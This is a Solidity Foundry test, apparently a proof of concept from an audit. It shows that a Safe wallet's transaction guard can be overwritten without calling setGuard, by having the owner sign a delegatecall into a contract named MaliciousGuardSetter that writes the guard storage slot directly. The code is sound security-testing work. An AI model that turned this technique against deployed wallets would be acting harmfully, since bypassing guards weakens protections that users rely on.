// run forge test --match-path test/guardAddressChange.t.sol 


pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Safe} from "../contracts/Safe.sol";
import {SafeProxy} from "../contracts/proxies/SafeProxy.sol";
import {Enum} from "../contracts/libraries/Enum.sol";
// Importing the file to access the GUARD_STORAGE_SLOT constant
import "../contracts/libraries/SafeStorage.sol";

contract MaliciousGuardSetter {
    // Write directly to the Safe's guard storage slot
    function writeGuard(address newGuard) external {
        bytes32 slot = GUARD_STORAGE_SLOT; // from imported SafeStorage.sol
        assembly {
            sstore(slot, newGuard)
        }
    }
}

contract GuardChangeTest is Test {
    Safe internal safeImpl;
    SafeProxy internal proxy;
    Safe internal safe; // Cast proxy as Safe
    MaliciousGuardSetter internal mal;

    uint256 internal ownerPk;
    address internal owner;

    function setUp() public {
        // Create owner
        ownerPk = 0xA11CE;
        owner = vm.addr(ownerPk);

        // Deploy Safe implementation
        safeImpl = new Safe();

        // Deploy proxy pointing to implementation
        proxy = new SafeProxy(address(safeImpl));

        // Cast proxy to Safe interface
        safe = Safe(payable(address(proxy)));

        // Setup Safe owners via proxy
        address[] memory owners = new address[](1);
        owners[0] = owner;
        safe.setup(
            owners,
            1,                // threshold
            address(0),       // to
            "",               // data
            address(0),       // fallbackHandler
            address(0),       // paymentToken
            0,                // payment
            payable(address(0))
        );

        // Deploy malicious contract
        mal = new MaliciousGuardSetter();
    }

    function test_changeGuardWithoutSetGuard() public {
        // Verify initial guard is zero
        bytes32 rawBefore = _readSlot(GUARD_STORAGE_SLOT);
        assertEq(address(uint160(uint256(rawBefore))), address(0), "initial guard must be zero");

        // Prepare a delegatecall to malicious writeGuard
        address newGuard = address(0xBEEF);
        bytes memory data = abi.encodeWithSignature("writeGuard(address)", newGuard);

        // Execute the transaction (delegatecall into malicious contract)
        bool success = _execDelegateCallAsSafe(address(mal), data, ownerPk);
        assertTrue(success, "execTransaction failed");

        // Read the guard directly from storage
        bytes32 rawAfter = _readSlot(GUARD_STORAGE_SLOT);
        address storedGuard = address(uint160(uint256(rawAfter)));

        // Assert the guard changed without calling setGuard
        assertEq(storedGuard, newGuard, "guard not changed by delegatecall");
    }

    function _execDelegateCallAsSafe(address to, bytes memory data, uint256 ownerPk_input) internal returns (bool) {
        uint256 _nonce = safe.nonce();
        bytes32 txHash = safe.getTransactionHash(
            to,
            0,
            data,
            Enum.Operation.DelegateCall,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            _nonce
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk_input, txHash);
        bytes memory signatures = abi.encodePacked(r, s, v); // single owner

        return safe.execTransaction(
            to,
            0,
            data,
            Enum.Operation.DelegateCall,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signatures
        );
    }

    function _readSlot(bytes32 slot) internal view returns (bytes32 word) {
        // Safe#getStorageAt allows reading arbitrary slots; pass the slot as uint and length 1
        bytes memory data = safe.getStorageAt(uint256(slot), 1);
        // data is bytes(32); decode the single word
        assembly {
            word := mload(add(data, 0x20))
        }
    }
}

